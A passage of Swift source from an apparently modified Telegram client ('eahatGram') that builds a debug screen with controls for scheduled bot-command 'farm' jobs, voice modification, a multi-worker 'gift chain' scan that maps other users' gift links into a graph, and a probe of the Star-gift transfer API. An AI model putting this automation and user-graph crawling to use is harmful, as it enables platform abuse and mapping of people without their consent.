            EahatGramFarmManager.shared.refreshBackgroundScheduling()
            appendResponse("farmBackground enabled=\(value)")
        },
        addFarmJob: {
            let currentState = stateValue.with { $0 }
            let botUsername = eahatGramNormalizedFarmUsername(currentState.farmBotUsernameText)
            let command = currentState.farmCommandText.trimmingCharacters(in: .whitespacesAndNewlines)
            guard !botUsername.isEmpty else {
                appendResponse("farm add failed reason=BOT_USERNAME_EMPTY")
                return
            }
            guard !command.isEmpty else {
                appendResponse("farm add failed reason=COMMAND_EMPTY")
                return
            }
            let interval = eahatGramPositiveInt(currentState.farmIntervalText, defaultValue: 240, minValue: 1, maxValue: 10080)
            EahatGramFarmManager.shared.addJob(botUsername: botUsername, command: command, intervalMinutes: Int32(interval))
            updateState { current in
                var current = current
                current.farmBotUsernameText = ""
                current.farmCommandText = ""
                current.farmIntervalText = "\(interval)"
                return current
            }
            appendResponse("farm add completed bot=@\(botUsername) interval=\(interval) command=\(command)")
        },
        updateFarmJobEnabled: { index, value in
            let farmJobs = currentFarmJobs.with { $0 }
            guard index >= 0 && index < farmJobs.count else {
                appendResponse("farm toggle failed index=\(index) reason=OUT_OF_RANGE")
                return
            }
            let job = farmJobs[index]
            EahatGramFarmManager.shared.setJobEnabled(id: job.id, value: value)
            appendResponse("farm toggle completed id=\(job.id) enabled=\(value)")
        },
        removeFarmJob: { index in
            let farmJobs = currentFarmJobs.with { $0 }
            guard index >= 0 && index < farmJobs.count else {
                appendResponse("farm remove failed index=\(index) reason=OUT_OF_RANGE")
                return
            }
            let job = farmJobs[index]
            EahatGramFarmManager.shared.removeJob(id: job.id)
            appendResponse("farm remove completed id=\(job.id)")
        },
        updateVoiceModEnabled: { value in
            EahatGramDebugSettings.setVoiceModEnabled(value)
            updateState { current in
                var current = current
                current.voiceModEnabled = value
                return current
            }
            appendResponse("voiceMod enabled=\(value)")
        },
        selectVoiceModPreset: {
            let presentationData = context.sharedContext.currentPresentationData.with { $0 }
            let actionSheet = ActionSheetController(presentationData: presentationData)
            let items: [ActionSheetItem] = EahatGramVoiceModPreset.allCases.map { preset in
                ActionSheetButtonItem(title: preset.title, color: .accent, action: { [weak actionSheet] in
                    actionSheet?.dismissAnimated()
                    EahatGramDebugSettings.setVoiceModPreset(preset)
                    updateState { current in
                        var current = current
                        current.voiceModPreset = preset.title
                        return current
                    }
                    appendResponse("voiceMod preset=\(preset.rawValue)")
                })
            }
            actionSheet.setItemGroups([
                ActionSheetItemGroup(items: items),
                ActionSheetItemGroup(items: [
                    ActionSheetButtonItem(title: presentationData.strings.Common_Cancel, color: .accent, font: .bold, action: { [weak actionSheet] in
                        actionSheet?.dismissAnimated()
                    })
                ])
            ])
            presentControllerImpl?(actionSheet)
        },
        updateVoiceModV2Enabled: { value in
            EahatGramDebugSettings.setVoiceModV2Enabled(value)
            updateState { current in
                var current = current
                current.voiceModV2Enabled = value
                return current
            }
            appendResponse("voiceModV2 enabled=\(value)")
        },
        selectVoiceModV2Voice: {
            let presentationData = context.sharedContext.currentPresentationData.with { $0 }
            let actionSheet = ActionSheetController(presentationData: presentationData)
            let items: [ActionSheetItem] = EahatGramVoiceModV2Voice.allCases.map { preset in
                ActionSheetButtonItem(title: preset.title, color: .accent, action: { [weak actionSheet] in
                    actionSheet?.dismissAnimated()
                    EahatGramDebugSettings.setVoiceModV2Voice(preset)
                    updateState { current in
                        var current = current
                        current.voiceModV2Voice = preset.title
                        return current
                    }
                    appendResponse("voiceModV2 voice=\(preset.rawValue)")
                })
            }
            actionSheet.setItemGroups([
                ActionSheetItemGroup(items: items),
                ActionSheetItemGroup(items: [
                    ActionSheetButtonItem(title: presentationData.strings.Common_Cancel, color: .accent, font: .bold, action: { [weak actionSheet] in
                        actionSheet?.dismissAnimated()
                    })
                ])
            ])
            presentControllerImpl?(actionSheet)
        },
        updateUseDirectRpc: { value in
            updateState { current in
                var current = current
                current.useDirectRpc = value
                return current
            }
        },
        updateChainPeerId: { value in
            updateState { current in
                var current = current
                current.chainPeerIdText = eahatGramNormalizedNumericText(value, maxLength: 18)
                return current
            }
        },
        updateChainDepth: { value in
            updateState { current in
                var current = current
                current.chainDepthText = eahatGramNormalizedNumericText(value, maxLength: 2)
                return current
            }
        },
        updateChainPeerLimit: { value in
            updateState { current in
                var current = current
                current.chainPeerLimitText = eahatGramNormalizedNumericText(value, maxLength: 2)
                return current
            }
        },
        updateChainWorkerCount: { value in
            updateState { current in
                var current = current
                current.chainWorkerCountText = eahatGramNormalizedNumericText(value, maxLength: 2)
                return current
            }
        },
        openCurrentChainVisualization: {
            openCurrentChainVisualizationImpl?()
        },
        runChainScan: {
            let currentState = stateValue.with { $0 }
            guard let rootPeerId = eahatGramPeerIdFromText(currentState.chainPeerIdText) else {
                let line = "giftChain failed reason=PEER_ID_INVALID value=\(currentState.chainPeerIdText)"
                setChainStatus(line)
                appendResponse(line)
                return
            }

            let maxDepth = eahatGramPositiveInt(currentState.chainDepthText, defaultValue: 1, minValue: 1, maxValue: 9)
            let peerLimit = eahatGramPositiveInt(currentState.chainPeerLimitText, defaultValue: 1, minValue: 1, maxValue: 25)
            let workerCount = eahatGramPositiveInt(currentState.chainWorkerCountText, defaultValue: eahatGramGiftChainDefaultConcurrentPeers, minValue: 1, maxValue: 16)
            let generation = chainBuildGeneration.modify { current in
                return current + 1
            }
            let startLine = "giftChain started peerId=\(rootPeerId.id._internalGetInt64Value()) depth=\(maxDepth) limit=\(peerLimit) workers=\(workerCount)"
            setChainStatus(startLine)
            appendResponse(startLine)

            chainBuildDisposable.set(nil)
            setCurrentChainVisualizationState(nil)
            chainBuildDisposable.set((eahatGramBuildGiftChainSignal(
                context: context,
                rootPeerId: rootPeerId,
                maxDepth: maxDepth,
                peerLimit: peerLimit,
                maxConcurrentPeers: workerCount
            )
            |> deliverOnMainQueue).start(next: { event in
                guard generation == chainBuildGeneration.with({ $0 }) else {
                    return
                }
                switch event {
                case let .progress(text):
                    setChainStatus(text)
                case let .completed(graph):
                    let completedLine = "giftChain completed peerId=\(rootPeerId.id._internalGetInt64Value()) nodes=\(graph.nodes.count) edges=\(graph.edges.count) truncated=\(graph.isTruncated ? 1 : 0)"
                    setChainStatus(completedLine)
                    appendResponse(completedLine)
                    let visualizationState = EahatGramGiftChainVisualizationState(
                        graph: graph,
                        focusedPeerId: graph.rootPeerId,
                        manualOrigins: [:],
                        selectedEdges: [],
                        isVisualLineMode: false
                    )
                    setCurrentChainVisualizationState(visualizationState)
                    openCurrentChainVisualizationImpl?()
                }
            }, completed: {
                guard generation == chainBuildGeneration.with({ $0 }) else {
                    return
                }
                chainBuildDisposable.set(nil)
            }))
        },
        updateFunctestToggle: { index, value in
            guard let toggle = EahatGramFunctestToggle(rawValue: index) else {
                appendResponse("functestToggle failed reason=UNKNOWN_TOGGLE index=\(index)")
                return
            }
            let _ = updateExperimentalUISettingsInteractively(accountManager: context.sharedContext.accountManager, { settings in
                var settings = settings
                toggle.update(settings: &settings, value: value)
                return settings
            }).start()
            updateState { current in
                var current = current
                toggle.update(state: &current, value: value)
                return current
            }
            appendResponse("functestToggle key=\(toggle.responseKey) value=\(value ? 1 : 0)")
        },
        refreshResponses: refreshResponses,
        runGiftProbe: { index in
            let gifts = currentGifts.with { $0 }
            guard index >= 0 && index < gifts.count else {
                appendResponse("runGiftProbe failed index=\(index) reason=OUT_OF_RANGE")
                return
            }
            let gift = gifts[index]
            guard let peerId = stateValue.with({ $0.selectedPeerId }) else {
                appendResponse("runGiftProbe failed index=\(index) reason=TARGET_PEER_NOT_SELECTED")
                return
            }
            guard let reference = gift.reference else {
                appendResponse("runGiftProbe failed index=\(index) reason=REFERENCE_IS_NIL")
                return
            }
            let useDirectRpc = stateValue.with { $0.useDirectRpc }
            let startedLine = "runGiftProbe index=\(index) peerId=\(peerId) prepaid=\(useDirectRpc) title=\(eahatGramGiftTitle(gift))"
            appendResponse(startedLine)
            probeDisposable.set((context.engine.payments.probeTransferStarGift(prepaid: useDirectRpc, reference: reference, peerId: peerId)
            |> deliverOnMainQueue).start(next: { result in
                appendResponse(result)
                refreshResponses()
            }))
        },
        showOtherMethod: { index in
            let methods = eahatGramOtherMethods()
            guard index >= 0 && index < methods.count else {
                appendResponse("showOtherMethod failed index=\(index) reason=OUT_OF_RANGE")
                return
            }
            appendResponse("otherMethod title=\(methods[index].title) info=\(methods[index].info)")
        }
    )

    let signal = combineLatest(
        context.sharedContext.presentationData,
        statePromise.get(),
        giftsPromise.get(),
        EahatGramFarmManager.shared.jobsSignal()
    )
    |> deliverOnMainQueue
    |> map { presentationData, state, gifts, farmJobs -> (ItemListControllerState, (ItemListNodeState, Any)) in
        let noGiftsText = "No gifts loaded"
        _ = currentFarmJobs.swap(farmJobs)

        let controllerState = ItemListControllerState(
            presentationData: ItemListPresentationData(presentationData),
            title: .textWithTabs("eahatGram", ["me", "test", "chain", "ai", "farm", "functest", "walpaper"], state.selectedTab.rawValue),
            leftNavigationButton: nil,
            rightNavigationButton: nil,
            backNavigationButton: ItemListBackButton(title: presentationData.strings.Common_Back),
            animateChanges: false
        )
        let listState = ItemListNodeState(
            presentationData: ItemListPresentationData(presentationData),
            entries: eahatGramEntries(state: state, presentationData: presentationData, gifts: gifts, farmJobs: farmJobs, noGiftsText: noGiftsText, hasStarsContext: starsContext != nil),
            style: .blocks,
            animateChanges: true
        )
        return (controllerState, (listState, arguments))
    }
    |> afterDisposed {
        probeDisposable.dispose()
        chainBuildDisposable.dispose()
        profileGiftsContextStateDisposable.dispose()
        removeContactsDisposable.dispose()
        removeCallsDisposable.dispose()
    }

    let controller = EahatGramItemListController(context: context, state: signal)
    controller.titleControlValueChanged = { index in
        guard let selectedTab = EahatGramTab(rawValue: index) else {
            return
        }
        updateState { current in
            var current = current
            current.selectedTab = selectedTab
            return current
        }
    }
    pushControllerImpl = { [weak controller] c in
        (controller?.navigationController as? NavigationController)?.pushViewController(c)
    }
    presentControllerImpl = { [weak controller] c in
        controller?.present(c, in: .window(.root))
    }
    openCurrentChainVisualizationImpl = {
        guard let visualizationState = eahatGramPersistedChainVisualizationState.with({ $0 }) else {
            appendResponse("giftChain open failed reason=VISUALIZATION_IS_NIL")
            return
        }
        let chainController = EahatGramGiftChainScreen(
            context: context,
            visualizationState: visualizationState,
            stateUpdated: { updatedState in
                setCurrentChainVisualizationState(updatedState)
            }
        )
        pushControllerImpl?(chainController)
    }

    return controller
}
